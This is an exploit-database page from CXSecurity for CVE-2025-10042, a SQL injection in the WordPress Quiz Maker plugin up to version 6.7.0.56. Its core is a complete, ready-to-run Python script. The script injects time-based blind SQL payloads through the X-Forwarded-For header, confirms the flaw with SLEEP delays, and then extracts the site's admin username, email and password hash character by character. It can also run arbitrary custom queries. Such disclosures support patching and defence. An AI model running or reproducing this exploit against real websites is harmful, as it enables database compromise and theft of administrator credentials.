---
title: WordPress Quiz Maker 6.7.0.56 SQL Injection
url: https://cxsecurity.com/issue/WLB-2026010005
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-01-12
fetch_date: 2026-01-13T03:26:07.309266
---

# WordPress Quiz Maker 6.7.0.56 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WordPress Quiz Maker 6.7.0.56 SQL Injection** **2026.01.12**  Credit:  **[Rahul Sreenivasan](https://cxsecurity.com/author/Rahul%2BSreenivasan/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-10042](https://cxsecurity.com/cveshow/CVE-2025-10042/ "Click to see CVE-2025-10042")**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

# Exploit Title: WordPress Quiz Maker 6.7.0.56 - SQL Injection
# Date: 2025-12-16
# Exploit Author: Rahul Sreenivasan (Tr0j4n)
# Vendor Homepage: https://ays-pro.com/wordpress/quiz-maker
# Software Link: https://wordpress.org/plugins/quiz-maker/
# Version: <= 6.7.0.56
# Tested on: WordPress 6.x with Quiz Maker 6.7.0.56 on Ubuntu/Nginx/PHP-FPM
# CVE: CVE-2025-10042
from argparse import ArgumentParser
from requests import get
from requests.packages.urllib3 import disable\_warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from time import time
from sys import exit
disable\_warnings(InsecureRequestWarning)
CHARSET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\_-@.!$/:?"
def send\_payload(url, path, header, payload, timeout):
target = f"{url.rstrip('/')}/{path.lstrip('/')}"
headers = {
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
header: payload
}
try:
start = time()
get(target, headers=headers, timeout=timeout, verify=False)
return time() - start
except:
return timeout
def check\_vulnerable(url, path, header, sleep\_time, timeout):
print("[\*] Testing for SQL injection vulnerability...")
baseline = send\_payload(url, path, header, "127.0.0.1", timeout)
print(f"[\*] Baseline response time: {baseline:.2f}s")
payload = f"1' OR SLEEP({sleep\_time})#"
injection = send\_payload(url, path, header, payload, timeout)
print(f"[\*] Injection response time: {injection:.2f}s")
if injection >= sleep\_time \* 0.7:
print("[+] Target is VULNERABLE!")
return True
else:
print("[-] Target does not appear to be vulnerable.")
return False
def extract\_length(url, path, header, query, timeout):
low, high = 1, 100
while low < high:
mid = (low + high) // 2
payload = f"1' OR IF(LENGTH(({query}))>{mid},SLEEP(1),0)#"
elapsed = send\_payload(url, path, header, payload, timeout)
if elapsed >= 0.8:
low = mid + 1
else:
high = mid
return low
def extract\_char(url, path, header, query, position, timeout):
low, high = 32, 126
while low < high:
mid = (low + high) // 2
payload = f"1' OR IF(ASCII(SUBSTRING(({query}),{position},1))>{mid},SLEEP(1),0)#"
elapsed = send\_payload(url, path, header, payload, timeout)
if elapsed >= 0.8:
low = mid + 1
else:
high = mid
return chr(low) if low <= 126 else "?"
def extract\_data(url, path, header, query, timeout):
length = extract\_length(url, path, header, query, timeout)
print(f"[\*] Data length: {length}")
result = ""
for i in range(1, length + 1):
char = extract\_char(url, path, header, query, i, timeout)
result += char
print(f"\r[\*] Extracting: {result}", end="", flush=True)
print()
return result
def dump\_users(url, path, header, timeout):
print("\n[\*] Extracting WordPress admin users...")
# Get admin user login
query = "SELECT user\_login FROM wp\_users WHERE ID=1"
username = extract\_data(url, path, header, query, timeout)
print(f"[+] Username: {username}")
# Get admin email
query = "SELECT user\_email FROM wp\_users WHERE ID=1"
email = extract\_data(url, path, header, query, timeout)
print(f"[+] Email: {email}")
# Get password hash
query = "SELECT user\_pass FROM wp\_users WHERE ID=1"
password = extract\_data(url, path, header, query, timeout)
print(f"[+] Password Hash: {password}")
return username, email, password
def main():
parser = ArgumentParser(description="WordPress Quiz Maker SQLi Exploit (CVE-2025-10042)")
parser.add\_argument("-u", "--url", required=True, help="Target WordPress URL")
parser.add\_argument("-p", "--path", required=True, help="Path to quiz page")
parser.add\_argument("-H", "--header", default="X-Forwarded-For", help="Header for injection")
parser.add\_argument("-t", "--timeout", type=int, default=10, help="Request timeout")
parser.add\_argument("--check", action="store\_true", help="Only check vulnerability")
parser.add\_argument("--dump", action="store\_true", help="Dump admin credentials")
parser.add\_argument("--query", help="Custom SQL query to extract")
args = parser.parse\_args()
print("[+] WordPress Quiz Maker SQLi Exploit (CVE-2025-10042)")
print(f"[+] Target: {args.url}")
if not check\_vulnerable(args.url, args.path, args.header, 3, args.timeout):
exit(1)
if args.check:
exit(0)
if args.dump:
dump\_users(args.url, args.path, args.header, args.timeout)
elif args.query:
print(f"\n[\*] Executing custom query: {args.query}")
result = extract\_data(args.url, args.path, args.header, args.query, args.timeout)
print(f"[+] Result: {result}")
else:
dump\_users(args.url, args.path, args.header, args.timeout)
if \_\_name\_\_ == "\_\_main\_\_":
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026010005)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top